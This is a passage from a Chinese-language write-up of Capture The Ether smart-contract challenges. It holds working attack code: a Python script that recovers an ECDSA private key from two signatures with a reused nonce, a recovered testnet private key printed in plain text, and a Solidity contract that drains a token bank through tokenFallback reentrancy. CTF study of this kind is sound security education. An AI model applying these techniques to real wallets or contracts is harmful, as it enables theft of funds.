        data: iface.encodeFunctionData("authenticate", ["0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4"]),
    }
    const hash = await wallet.sendTransaction(tx)
    await hash.wait()
    console.log("Send Tx", hash.hash)
}
```

 返回Check, 完成✅

---

###### Takeover Account

这个题目的要求, 是 从指定的账户 `0x6B477781b0e68031109f21887e6B5afEAaEB002b` 发出一笔tx, **如果想要从某个account发出tx, 那么 一定要需要掌握这个account的私钥**, 因此 我们要去推这个账户的私钥.

查询账户的历史交易记录, 能发现此Account 发出过两笔tx, 用的都是同一个 **在ECDSA中的k-value** [所反映出来的就是 **签名的r值是相同的**, 理论上来说 k-value 都是不同的, 即签名的r值是不同的,  **这里的两笔tx的r 是相同的, 那么我们就能根据两个相同的r 计算出私钥**] 

> 由于 ropsten.etherscan 不好使, 看不到那条记录, 所以可以download成csv, 第一条和第二条tx 这是对应的, 分别是如下两条:
>
> 1. “0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396”
> 2. “0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009“ 
>
> 相应的理论知识可以看最后的参考文献 ❤️

首先, 利用这两条tx 求出我们所需要的信息 (s1, z1) (s2, z2) 以及 r, 相应的JS代码如下: 

```javascript
async function main(){
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
  const tx1  = await provider.getTransaction("0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396")
  const signingData1 = ethers.utils.serializeTransaction({
    to: tx1.to,
    value: tx1.value,
    gasLimit: tx1.gasLimit,
    gasPrice: tx1.gasPrice,
    nonce: tx1.nonce,
    chainId: tx1.chainId,
    data: tx1.data
  })
  const z1 = ethers.utils.keccak256(signingData1)
  console.log("s1",tx1.s)
  console.log("z1",z1)

  const tx2  = await provider.getTransaction("0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009")
  const signingData2 = ethers.utils.serializeTransaction({
    to: tx2.to,
    value: tx2.value,
    gasLimit: tx2.gasLimit,
    gasPrice: tx2.gasPrice,
    nonce: tx2.nonce,
    chainId: tx2.chainId,
    data: tx2.data
  })
  const z2 = ethers.utils.keccak256(signingData2)
  console.log("s2",tx2.s)
  console.log("z2",z2)
  console.log("r",tx2.r)
}
```

其次 有了上面所求信息, 用Python 求解私钥, Python代码如下:

```python
r  = 0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166

# txid: 0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396
s1 = 0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8
z1 = 0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04

# txid: 0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009
s2 = 0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de
z2 = 0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c

# prime order p
# 素数阶p 已知
p = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

# based on Fermat's Little Theorem
# works only on prime n
def inverse_mod(a, n):
    return pow(a, n-2, n) 
    

k = (z1 - z2) * inverse_mod(s1 - s2, p) % p             # derive k for s1 - s2
pk = (s1 * k - z1) * inverse_mod(r, p) % p              # derive private key  
pkNeg = (-s1 * (-k % p) - z1) * inverse_mod(r, p) % p   # -k (mod p) of s1 - s2 == -s1 + s2, check -s1

print('k           = {:x}'.format(k))
print('k negation  = {:x}'.format(-k % p))
if pk == pkNeg:                                         # should not be false
    print('private key = {:x}'.format(pk))  

    
```

最后, 拿到私钥之后, 由于合约没有开源验证, 用ethers发起tx: 

```javascript
async function main(){
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
  const wallet = new ethers.Wallet("614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269", provider)
  let iface = new ethers.utils.Interface(["function authenticate()"])
  const tx = {
    to: "0x54B765f05Aa1d325900eC9E91f7021681F22A35C",
    data: iface.encodeFunctionData("authenticate", []),
  }
  const hash = await wallet.sendTransaction(tx)
  console.log(hash)
  await hash.wait()
  console.log("Send Tx",hash.hash)
}
```

返回Check, 完成✅

---

### Miscellaneous

###### Assume Ownership

这个题, 比较简单, 开始挑战之后, 去到合约地址, 由于已经开源验证, 所以 先执行`AssumeOwmershipChallenge` 这个函数, 再执行 `authenticate` 这个函数.

最后返回Check, 完成✅

---

###### Token Bank

这个题的意思是, 创建了一个Token--SET , 总量是 1,000,000 个 (单位是10**18), 然后又创建了个银行, 银行持有Token的一半, 开始挑战的人 (我) 持有Token的一半, 一开始SET的总量 都在这个银行里面存着, 但是我随时可以把属于我的那一半Token取出来.  这个题的要求是 把银行里面的Token 给他清空掉.

找一找bug, bug发生在这句话 `ITokenReceiver(to).tokenFallback(msg.sender, value, data);`  结合Bank里面的 `tokenFallback`  函数来看, 这句话想要做的是: 如果一个人响银行转帐, 那么这个人的账上就多出相应的余额, **只不过 判断条件错了** 这里的判断条件是 只要目的地是合约, 都会启动这句话, 因此 可以建立一个攻击合约. 攻击合约中写好`tokenFallback` 函数, **利用合约重入**,就可以把银行里的钱都转出来.

```javascript
// 读取mapping 即 balanceOf的一个小测试
const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
  let hash = await ethers.utils.keccak256(await ethers.utils.defaultAbiCoder.encode(["address","uint"], ["0x869D7e8506D5ABB5e516970dd4FA14AB66a603Fe",1]))
  console.log(hash)
  const slot = await provider.getStorageAt("0x681BE0B67e6917e84BbCFe925c551ca94d06bEb6",hash)
  console.log(slot)
```

首先, 先把属于我们自己的余额那一部分 转出来

```javascript
async function main(){
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
  const wallet = new ethers.Wallet(process.env.PK, provider)
  let iface = new ethers.utils.Interface(["function withdraw(uint256 amount)"])
  const tx = {
    to: "0x681BE0B67e6917e84BbCFe925c551ca94d06bEb6",
    data: iface.encodeFunctionData("withdraw", [ethers.utils.parseEther("500000")]),
  }
  const hash = await wallet.sendTransaction(tx)
  await hash.wait()
  console.log("Send Tx",hash.hash)
}d
```

其次, 我们部署Attack合约

```solidity
pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}
contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;
    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }
    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }
    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => mapping(address => uint256)) public allowance;
    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}
contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;
    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();
        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18;  // half for me
        balanceOf[player] = 500000 * 10**18;      // half for you
    }
    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }
    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}
contract Attack {
    address a = 0x681BE0B67e6917e84BbCFe925c551ca94d06bEb6;
    address b = 0x435c6119690afddb64b11f6d749b410257142e60;
    TokenBankChallenge target1;
    SimpleERC223Token target2;
    uint256 check;
    function Attack() payable{
        target1= TokenBankChallenge(a);
        target2= SimpleERC223Token(b);
    }

    function action1() public {
        target2.transferFrom(msg.sender ,address(this),500000000000000000000000);
    }
    function action2() public {

        target2.transfer(a,500000000000000000000000);
    }
    function tokenFallback() public {
        check=check+1;
        if(check <= 2){
        target1.withdraw(500000 * 10**18);    
        }
    }

    function () public payable {

    }
}
```

~~然后, 部署完成之后, 从Metamask里面 把我们钱包的 500,000 SET Token 转到部署好的Attack合约中~~

注意, 这里不能用Transfer转账, 因为 Transfer 的To是一个合约地址, 会激发我们Attack合约中的 `tokenFallback` 函数

所以需要我们将 SET 授权给 Attack, 授权代码

```javascript
async function main(){
  const provider = new ethers.providers.JsonRpcProvider(process.env.RPC)
  const wallet = new ethers.Wallet(process.env.PK, provider)
  let iface = new ethers.utils.Interface(["function approve(address spender, uint256 value)"])
  const tx = {
    to: "0x435c6119690afddb64b11f6d749b410257142e60",
    data: iface.encodeFunctionData("approve", ["0x1F0Fc75CaD196B0cA1dBe90E5f849153b98E99AF",ethers.utils.parseEther("500000")]),
  }
  const hash = await wallet.sendTransaction(tx)
  await hash.wait()
  console.log("Send Tx",hash.hash)
}
```

然后运行Attack合约的 action1, 利用 TranferFrom 转到Attack合约中, 

再运行 action2, 将Attack合约, 在银行中 有足够的余额.

最后运行 `tokenFallback` 则把Bank 中的 所有 SET Token 都清零了

返回Check, 完成✅

---

### Knowledge

###### Mapping Slot

上面有动态数组根据Slot, 拿到Value

如果是mapping, 则更特殊一些, 

```solidity
// SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  contract UserPass {
    //slot 0
    address public owner = msg.sender;
    // constant常量不占用slot
    uint public constant SomeCount = 123;
    struct User {
        bytes32 name;
        bytes32 password;
    }
    // slot 1
    mapping(address => User) private users;

    constructor() {
        owner = msg.sender;
    }

    function addUser(bytes32 _username, bytes32 _password) public {
        User memory user = User({name:_username, password:_password});
        users[msg.sender] = user;
    }

  }
```

```javascript
import { ethers, waffle } from "hardhat";
import { mainModule } from "process";
function addrAdd(_from:any, _num:number){
  let b = ethers.BigNumber.from(_from).add(_num)
  return ethers.utils.hexValue(b);
}

async function main() {
  const privider = waffle.provider;
  const UserPass = await ethers.getContractFactory("UserPass");
  const userpass = await UserPass.deploy();
  let user1, user2; 
  [user1, user2] = await ethers.getSigners();

  await userpass.deployed();
  console.log("\\nvault部署地址:%s\\nuser1.address:%s\\nuser2.address:%s", userpass.address, user1.address, user2.address);
  console.log("\\n---------userpass各slot数据------");
  // 因为users中没有数据，所以现在slot为owner, slot 1, slo2都为空
  for (let i = 0; i < 3; i++) {
    const element = await privider.getStorageAt(userpass.address, i);
    console.log('slot%s:%s', i , element);
  }
  // 向mapping中添加两个数据
  await userpass.connect(user1).addUser("0x0000000000000000000000000000000000000000000000000000000000313131",
                        "0x0000000000000000000000000000000000000000000000000000000031313131");
  await userpass.connect(user2).addUser("0x0000000000000000000000000000000000000000000000000000000000323232",
                        "0x0000000000000000000000000000000000000000000000000000000032323232");

//slot 1 users
let hash;
console.log("\\n与动态数组不同，mapping数据不在slot中存储长度:%s",await privider.getStorageAt(userpass.address, 1));
hash = await ethers.utils.keccak256(await ethers.utils.defaultAbiCoder.encode(["address", "uint"], [user1.address,1]))
console.log("\\n根据mapping的key(addr:%s)计算得到hash(即为value所在的槽地址)=%s", user1.address,hash); 
console.log("\\nmapping数据users的name:%s",await privider.getStorageAt(userpass.address, hash)); 
console.log("\\nmapping数据users的password:%s",await privider.getStorageAt(userpass.address, addrAdd(hash, 1)));

hash = await ethers.utils.keccak256(await ethers.utils.defaultAbiCoder.encode(["address", "uint"], [user2.address,1]))
console.log("\\n根据mapping的key(addr:%s)计算得到hash(即为value所在的槽地址)=%s", user2.address,hash); 
console.log("\\nmapping数据users的name:%s",await privider.getStorageAt(userpass.address, hash)); 
console.log("\\nmapping数据users的password:%s",await privider.getStorage At(userpass.address, addrAdd(hash, 1)));

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
```

---

###### 参考文献

[合约私有数据泄漏的安全问题分析及演示](https://learnblockchain.cn/article/4199#1.%20%E7%AE%80%E4%BB%8B)

[Capture The Ether Solutions](https://cmichel.io/capture-the-ether-solutions/)

[Smart Contract Exploits Part 1-3](https://celebrusadvisory.com/smart-contract-exploits-part-3/)

[capture the ether write up](https://www.anquanke.com/post/id/154104#h3-9)
